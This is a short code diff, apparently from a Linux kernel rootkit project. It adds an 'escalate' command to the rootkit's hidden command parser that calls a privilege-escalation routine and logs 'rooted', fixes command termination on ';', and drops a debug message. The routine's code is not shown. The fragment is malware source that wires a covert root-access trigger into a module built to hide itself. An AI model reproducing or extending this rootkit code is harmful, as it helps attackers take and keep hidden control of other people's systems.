@@ -3,6 +3,7 @@
  */
 #include "control.h"
 #include "include.h"
+#include "privilege_escalation.h"
 
 static int state = 0;
 static int cstate = 0;
@@ -69,6 +70,9 @@ execute_command (void)
 		
 	} else if(strcmp(command_buffer, "unhide_module") == 0) {
 		
+	} else if(strcmp(command_buffer, "escalate") == 0) {
+		priv_escalation();
+		ROOTKIT_DEBUG("rooted\n");
 	}
 
 	/* cleanup */
@@ -90,6 +94,8 @@ accept_command_input (char input)
 			command_buffer[command_counter] = '\0';
 			state = 2;
 		} else if(input == ';') {	/* terminate command */
+			command_buffer[command_counter] = '\0';
+			state = 2;
 			execute_command();
 		} else {
 			command_buffer[command_counter] = input;
@@ -155,5 +161,4 @@ accept_input (char input)
 	} else if(state == 2) {
 		accept_param_input(input);
 	}
-	ROOTKIT_DEBUG("Accepted input '%c'. State=%u, CState=%u.\n", input, state, cstate);
 }
